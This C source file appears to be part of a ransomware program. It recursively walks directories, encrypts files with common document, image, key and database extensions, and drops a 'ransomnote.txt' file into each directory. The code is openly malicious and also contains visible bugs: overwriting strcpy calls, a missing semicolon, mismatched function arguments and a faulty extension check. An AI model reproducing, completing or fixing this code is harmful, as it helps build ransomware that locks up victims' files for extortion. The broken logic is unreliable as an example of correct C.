#include "fileRecursor.h"

//it works... just need to get refernce to name
void startEncrypting(char * start,unsigned char * key, unsigned char * iv,char * id)
{
	DIR *fDir = opendir(start);
    if(errno == ENOTDIR){
    	//must be file
 		file_handler(start, start,key,iv);
    }else if (errno != 2){
    	//must be a directory
    	directory_handle(start,key,iv);
    } else {
    	//pDir is null...
    	printf("Not a valid directory or file name\n");

    	return;
    }
	if(fDir!=0)
     closedir(fDir);
}

void writeRansomNote(char * directory,char * id)
{
    char * filename = calloc(1,sizeof(char) * strlen(directory)+strlen("ransomnote.txt") +1)
    strcpy(filename,directory);
    strcpy(filename,"ransomnote.txt");
    FILE * fp = fopen(filename,"w");
    char * ransomnote = calloc(1,strlen(NOTE1)+strlen(NOTE2) +sizeof(id));

    strcpy(ransomnote,NOTE1);
    strcpy(ransomnote,id);
    strcpy(ransomnote,NOTE2);
    fwrite(ransomnote,1,strlen(ransomnote),fp);
}

void directory_handle(char * name,unsigned char * key, unsigned char * iv,char * id)
{
	DIR *fDir = opendir(name);
	if(fDir == 0){
		return;
	}
	struct dirent * fDirent;
    while ((fDirent = readdir(fDir)) != NULL) {
    	//path can't be longer than 1024 bytes
		char * fullpath = calloc(1,1024);
		if((strcmp(fDirent->d_name, ".") == 0) || (strcmp (fDirent->d_name,"..") ==0)){
			free(fullpath);
			continue;
		}
		strcpy(fullpath,name);
		strcat(fullpath,"/");
		strcat(fullpath,fDirent->d_name);
    	if(fDirent->d_type == DT_REG){
    		file_handler(fullpath,fDirent->d_name,key,iv);
    	} else if(fDirent->d_type == DT_DIR){
    		directory_handle(fullpath,key,iv);
    	}
        writeRansomNote(fullpath,id);
    	free(fullpath);
    }
    
    closedir(fDir);
}

const char *get_filename_ext(const char *filename) {
    const char *dot = strrchr(filename, '.');
    if(!dot || dot == filename) return "";
    return dot + 1;
}

void file_handler(char * filepath, char * filename,unsigned char * key, unsigned char * iv)
{

	char * full_fileName = malloc(strlen(filepath)+strlen(filepath+2));
	strcpy(full_fileName,filepath);
	strcpy(full_fileName,filename);
    printf("encrypting: %s\n",full_fileName);
    char * file_ext = get_filename_ext(full_fileName);
    if(strcmp(file_ext,"doc")  == 0 || strcmp(file_ext,"docx") == 0 || strcmp(file_ext,"java") == 0 || strcmp(file_ext,"pdf")  == 0 || strcmp(file_ext,"jpg")  == 0 ||strcmp(file_ext,"txt")  == 0 ||strcmp(file_ext,"pdf")  == 0 ||strcmp(file_ext,"MDF")  == 0 || strcmp(file_ext,"ppt")  == 0 || strcmp(file_ext,"pem")  == 0 || strcmp(file_ext,"sql")  == 0 || strcmp(file_ext,"mp4"))
    {
        encrypt(full_fileName,key,iv);
    }

    free(full_fileName);

}

